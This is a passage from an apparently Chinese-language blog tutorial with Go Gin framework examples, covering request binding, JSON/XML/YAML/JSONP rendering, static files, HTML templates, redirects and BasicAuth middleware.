class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Login <span class="keyword">struct</span> {</span><br><span class="line">User     <span class="keyword">string</span> <span class="string">`form:"user" json:"user" xml:"user"  binding:"required"`</span></span><br><span class="line">Password <span class="keyword">string</span> <span class="string">`form:"password" json:"password" xml:"password" binding:"required"`</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> {</span><br><span class="line">router := gin.New()</span><br><span class="line"><span class="keyword">var</span> test Login</span><br><span class="line">router.POST(<span class="string">"/login"</span>,<span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span>{</span><br><span class="line"><span class="comment">// 如果是Get，那么接收不到请求中的Post的数据</span></span><br><span class="line"><span class="comment">// 如果是Post, 首先判断 `content-type` 的类型 `JSON` or `XML`, 然后使用对应的绑定器获取数据.</span></span><br><span class="line"><span class="comment">//https://github.com/gin-gonic/gin/blob/master/binding/binding.go#L48</span></span><br><span class="line"><span class="keyword">if</span> err:=c.ShouldBind(&amp;test);err!=<span class="literal">nil</span>{</span><br><span class="line">c.JSON(<span class="number">400</span>,gin.H{<span class="string">"message"</span>:<span class="string">"login failed"</span>})</span><br><span class="line">}<span class="keyword">else</span>{</span><br><span class="line">c.JSON(<span class="number">200</span>,gin.H{</span><br><span class="line"><span class="string">"user"</span>:test.User,</span><br><span class="line"><span class="string">"pass"</span>:test.Password,</span><br><span class="line">})</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">})</span><br><span class="line">router.Run(<span class="string">":7777"</span>)</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>绑定<code>uri</code><br></p><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"github.com/gin-gonic/gin"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Login <span class="keyword">struct</span> {</span><br><span class="line">Path     <span class="keyword">string</span> <span class="string">`uri:"path" binding:"required"`</span></span><br><span class="line">User <span class="keyword">string</span> <span class="string">`uri:"user" binding:"required"`</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> {</span><br><span class="line">router := gin.New()</span><br><span class="line"><span class="keyword">var</span> test Login</span><br><span class="line">router.POST(<span class="string">"/:user/:path"</span>,<span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span>{</span><br><span class="line"><span class="keyword">if</span> err:=c.ShouldBindUri(&amp;test);err!=<span class="literal">nil</span>{</span><br><span class="line">c.JSON(<span class="number">400</span>,gin.H{<span class="string">"message"</span>:<span class="string">"login failed"</span>})</span><br><span class="line">}<span class="keyword">else</span>{</span><br><span class="line">c.JSON(<span class="number">200</span>,gin.H{</span><br><span class="line"><span class="string">"user"</span>:test.User,</span><br><span class="line"><span class="string">"pass"</span>:test.Path,</span><br><span class="line">})</span><br><span class="line">}</span><br><span class="line">})</span><br><span class="line">router.Run(<span class="string">":7777"</span>)</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>只绑定POST<br></p><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"github.com/gin-gonic/gin"</span></span><br><span class="line"><span class="string">"github.com/gin-gonic/gin/binding"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Login <span class="keyword">struct</span> {</span><br><span class="line">Username     <span class="keyword">string</span> <span class="string">`form:"username" binding:"required"`</span></span><br><span class="line">Password <span class="keyword">string</span> <span class="string">`form:"password" binding:"required"`</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> {</span><br><span class="line">router := gin.New()</span><br><span class="line"><span class="keyword">var</span> test Login</span><br><span class="line">router.POST(<span class="string">"/login"</span>,<span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span>{</span><br><span class="line"><span class="keyword">if</span> err:=c.ShouldBindWith(&amp;test,binding.Form);err!=<span class="literal">nil</span>{</span><br><span class="line">c.JSON(<span class="number">400</span>,gin.H{<span class="string">"message"</span>:<span class="string">"login failed"</span>})</span><br><span class="line">}<span class="keyword">else</span>{</span><br><span class="line">c.JSON(<span class="number">200</span>,gin.H{</span><br><span class="line"><span class="string">"user"</span>:test.Username,</span><br><span class="line"><span class="string">"pass"</span>:test.Password,</span><br><span class="line">})</span><br><span class="line">}</span><br><span class="line">})</span><br><span class="line">router.Run(<span class="string">":7777"</span>)</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>XML和JSON、YAML格式渲染<br></p><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"github.com/gin-gonic/gin"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Login <span class="keyword">struct</span> {</span><br><span class="line">Username     <span class="keyword">string</span> <span class="string">`form:"username" binding:"required"`</span></span><br><span class="line">Password <span class="keyword">string</span> <span class="string">`form:"password" binding:"required"`</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> {</span><br><span class="line">router := gin.Default()</span><br><span class="line"><span class="keyword">var</span> test =Login{</span><br><span class="line">Username: <span class="string">"abc"</span>,</span><br><span class="line">Password: <span class="string">"abc"</span>,</span><br><span class="line">}</span><br><span class="line">router.POST(<span class="string">"/json"</span>,<span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span>{</span><br><span class="line"></span><br><span class="line">c.JSON(<span class="number">200</span>,test)</span><br><span class="line">})</span><br><span class="line"></span><br><span class="line">router.POST(<span class="string">"/xml"</span>,<span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span>{</span><br><span class="line">c.XML(<span class="number">200</span>,gin.H{<span class="string">"status"</span>:<span class="number">200</span>,<span class="string">"msg"</span>:<span class="string">"suceess xml"</span>}) <span class="comment">//或者使用结构体也可以</span></span><br><span class="line">})</span><br><span class="line"></span><br><span class="line">router.POST(<span class="string">"yaml"</span>,<span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span>{</span><br><span class="line">c.YAML(<span class="number">200</span>,gin.H{<span class="string">"status"</span>:<span class="number">200</span>,<span class="string">"msg"</span>:<span class="string">"suceess yaml"</span>}) <span class="comment">//或者使用结构体也可以</span></span><br><span class="line">})</span><br><span class="line">router.Run(<span class="string">":7777"</span>)</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>JSONP<br></p><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"github.com/gin-gonic/gin"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> {</span><br><span class="line">router := gin.Default()</span><br><span class="line">param:=<span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">interface</span>{}{</span><br><span class="line"><span class="string">"name"</span>:<span class="string">"qiyou"</span>,</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">router.GET(<span class="string">"/JSONP"</span>,<span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span>{</span><br><span class="line">c.JSONP(<span class="number">200</span>,param)</span><br><span class="line">})</span><br><span class="line">router.Run(<span class="string">":7777"</span>)</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>访问<code>/JSONP?callback=call</code>，将会输出<code>call({"name":"qiyou"});</code></p><p><code>AsciiJSON</code></p><blockquote><p>将使特殊字符编码</p></blockquote><p>其实默认的<code>c.JSON</code>也会将特殊的HTML字符替换为对应的unicode字符<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line">import (</span><br><span class="line">"github.com/gin-gonic/gin"</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">type Login struct {</span><br><span class="line">Username     string `form:"username" binding:"required"`</span><br><span class="line">Password string `form:"password" binding:"required"`</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">func main() {</span><br><span class="line">router := gin.Default()</span><br><span class="line">param:=map[string]interface{}{</span><br><span class="line">"name":"&lt;b&gt;test&lt;/b&gt;",</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">router.GET("/JSON",func(c *gin.Context){</span><br><span class="line">c.AsciiJSON(200,param)</span><br><span class="line">})</span><br><span class="line">router.Run(":7777")</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p><code>PureJSON</code></p><blockquote><p>不将特殊字符编码</p></blockquote><p>PS: 该功能在go1.6及以下版本无法实现<br></p><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"github.com/gin-gonic/gin"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Login <span class="keyword">struct</span> {</span><br><span class="line">Username     <span class="keyword">string</span> <span class="string">`form:"username" binding:"required"`</span></span><br><span class="line">Password <span class="keyword">string</span> <span class="string">`form:"password" binding:"required"`</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> {</span><br><span class="line">router := gin.Default()</span><br><span class="line">param:=<span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">interface</span>{}{</span><br><span class="line"><span class="string">"name"</span>:<span class="string">"&lt;b&gt;test&lt;/b&gt;"</span>,</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">router.GET(<span class="string">"/JSON"</span>,<span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span>{</span><br><span class="line">c.PureJSON(<span class="number">200</span>,param)</span><br><span class="line">})</span><br><span class="line">router.Run(<span class="string">":7777"</span>)</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="静态文件"><a href="#静态文件" class="headerlink" title="静态文件"></a>静态文件</h3><p>设置静态文件路径<br>PS: 这些目录下资源是可以随时更新，而不用重新启动程序<br></p><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"github.com/gin-gonic/gin"</span></span><br><span class="line"><span class="string">"net/http"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> {</span><br><span class="line">router := gin.Default()</span><br><span class="line"><span class="comment">//设置单个文件</span></span><br><span class="line">router.StaticFile(<span class="string">"/1.png"</span>,<span class="string">"./static/1.png"</span>)</span><br><span class="line"><span class="comment">//设置一个文件夹</span></span><br><span class="line">router.StaticFS(<span class="string">"/other"</span>,http.Dir(<span class="string">"./Static"</span>))</span><br><span class="line">router.Run(<span class="string">":7777"</span>)</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>返回第三方获取的数据<br></p><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"github.com/gin-gonic/gin"</span></span><br><span class="line"><span class="string">"net/http"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> {</span><br><span class="line">router := gin.Default()</span><br><span class="line">router.GET(<span class="string">"/test"</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> {</span><br><span class="line">response, err := http.Get(<span class="string">"https://raw.githubusercontent.com/gin-gonic/logo/master/color.png"</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> || response.StatusCode != http.StatusOK {</span><br><span class="line">c.Status(http.StatusServiceUnavailable)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">reader := response.Body</span><br><span class="line">contentLength := response.ContentLength</span><br><span class="line">contentType := response.Header.Get(<span class="string">"Content-Type"</span>)</span><br><span class="line"></span><br><span class="line">extraHeaders := <span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">string</span>{</span><br><span class="line"><span class="string">"Content-Disposition"</span>: <span class="string">`attachment; filename="gopher.png"`</span>,</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">c.DataFromReader(http.StatusOK, contentLength, contentType, reader, extraHeaders)</span><br><span class="line">})</span><br><span class="line">router.Run(<span class="string">":7777"</span>)</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>模板渲染</p><ol><li><code>LoadHTMLGlob()</code>: 支持统配符</li><li><code>LoadHTMLFiles()</code>: 支持多个文件<br>PS: LoadHTMLGlob和LoadHTMLFiles只能使用其中一个，否则后者会覆盖掉前者</li><li><code>r.LoadHTMLGlob("template/*")</code>//此处加载html路径只能指定一次，如果指定多次只有最后一次有效<br><code>r.LoadHTMLGlob("view/*")</code> //此处重新设置了html的路径，所以template中的html就无法起作用。</li><li><code>r.LoadHTMLGlob("template/**/*")</code>: 匹配<code>template</code>子文件夹里面的文件，但是不匹配<code>template</code>下的文件，比如只匹配<code>template/test/index.html</code>,但是不匹配<code>template/index.html</code></li></ol><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"github.com/gin-gonic/gin"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> {</span><br><span class="line">router := gin.Default()</span><br><span class="line">router.LoadHTMLFiles(<span class="string">"./templates/index.html"</span>)</span><br><span class="line">router.GET((<span class="string">"/index"</span>),<span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span>{</span><br><span class="line">c.HTML(<span class="number">200</span>,<span class="string">"index.html"</span>,gin.H{</span><br><span class="line"><span class="string">"title"</span>:<span class="string">"test"</span>,</span><br><span class="line"><span class="string">"name"</span>:<span class="string">"zhangsan"</span>,</span><br><span class="line">})</span><br><span class="line">})</span><br><span class="line">router.Run(<span class="string">":7777"</span>)</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>index.html<br></p><figure class="highlight"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">"en"</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">"UTF-8"</span>&gt;</span><br><span class="line">    &lt;title&gt;{{.title}}&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    {{.name}}</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></tbody></table></figure><p></p><p>路径不同相同文件名的模板渲染，使用`{{defind "name"}}`定义以下模板名称<br></p><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"github.com/gin-gonic/gin"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> {</span><br><span class="line">router := gin.Default()</span><br><span class="line">router.LoadHTMLGlob(<span class="string">"./templates/**/*"</span>)</span><br><span class="line">router.GET((<span class="string">"/user"</span>),<span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span>{</span><br><span class="line">c.HTML(<span class="number">200</span>,<span class="string">"users/index.html"</span>,gin.H{ <span class="comment">//这里填写的是模板名称</span></span><br><span class="line"><span class="string">"title"</span>:<span class="string">"users"</span>,</span><br><span class="line"><span class="string">"name"</span>:<span class="string">"zhangsan"</span>,</span><br><span class="line">})</span><br><span class="line">})</span><br><span class="line"></span><br><span class="line">router.GET((<span class="string">"/posts"</span>),<span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span>{</span><br><span class="line">c.HTML(<span class="number">200</span>,<span class="string">"posts/index.html"</span>,gin.H{ <span class="comment">//这里填写的是模板名称</span></span><br><span class="line"><span class="string">"title"</span>:<span class="string">"posts"</span>,</span><br><span class="line"><span class="string">"name"</span>:<span class="string">"lisi"</span>,</span><br><span class="line">})</span><br><span class="line">})</span><br><span class="line">router.Run(<span class="string">":7777"</span>)</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p><code>posts/index.html</code>内容</p><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">{{define <span class="string">"posts/index.html"</span>}} <span class="comment">//定义模板名称，模板名称可以随便定义，但是建议还是和以目录的形式会好一点</span></span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">"en"</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">"UTF-8"</span>&gt;</span><br><span class="line">    &lt;title&gt;{{.title}}&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    {{.name}}</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">{{end}} <span class="comment">//end</span></span><br></pre></td></tr></tbody></table></figure><p>自定义模板函数<br>PS: 默认模板渲染的时候会自动html编码，<br><code>router.SetFuncMap</code>必须在<code>router.LoadHTMLGlob</code>前面，否则会宕机<br></p><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"github.com/gin-gonic/gin"</span></span><br><span class="line"><span class="string">"html/template"</span></span><br><span class="line"><span class="string">"strings"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> {</span><br><span class="line">router := gin.Default()</span><br><span class="line">router.SetFuncMap(template.FuncMap{</span><br><span class="line"><span class="string">"htmlspecialchars"</span>:HTMLspecialchars,</span><br><span class="line">})</span><br><span class="line">router.LoadHTMLGlob(<span class="string">"./templates/index.html"</span>)</span><br><span class="line">router.GET(<span class="string">"/test"</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> {</span><br><span class="line">c.HTML(<span class="number">200</span>,<span class="string">"index.html"</span>, gin.H{</span><br><span class="line"><span class="string">"title"</span>:<span class="string">"test"</span>,</span><br><span class="line"><span class="string">"name"</span>:<span class="string">"&lt;abc&gt;"</span>,</span><br><span class="line">})</span><br><span class="line">})</span><br><span class="line">router.Run(<span class="string">":7777"</span>)</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">HTMLspecialchars</span><span class="params">(s <span class="keyword">string</span>)</span><span class="title">string</span></span>{</span><br><span class="line"><span class="keyword">return</span> strings.Replace(s,<span class="string">"&lt;"</span>,<span class="string">"&amp;lt;"</span>,<span class="number">-1</span>)</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h3><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"github.com/gin-gonic/gin"</span></span><br><span class="line"><span class="string">"net/http"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> {</span><br><span class="line">router := gin.Default()</span><br><span class="line">router.GET(<span class="string">"/test"</span>,<span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span>{</span><br><span class="line">c.Redirect(http.StatusMovedPermanently,<span class="string">"http://www.baidu.com"</span>) <span class="comment">//支持内部重定向和外部重定向</span></span><br><span class="line">})</span><br><span class="line">router.Run(<span class="string">":7777"</span>)</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="验证中间件"><a href="#验证中间件" class="headerlink" title="验证中间件"></a>验证中间件</h3><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"github.com/gin-gonic/gin"</span></span><br><span class="line"><span class="string">"net/http"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> {</span><br><span class="line">router := gin.Default()</span><br><span class="line">router.Use(gin.BasicAuth(gin.Accounts{</span><br><span class="line"><span class="string">"admin"</span>:<span class="string">"admin"</span>,</span><br><span class="line">}))</span><br><span class="line">router.GET(<span class="string">"/admin"</span>,<span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span>{</span><br><span class="line">c.JSON(http.StatusOK,gin.H{</span><br><span class="line"><span class="string">"hello"</span>:c.MustGet(gin.AuthUserKey).(<span class="keyword">string</span>), <span class="comment">//获取用户名</span></span><br><span class="line">})</span><br><span class="line">})</span><br><span class="line">router.Run(<span class="string">":7777"</span>)</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>路由组使用<br></p><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 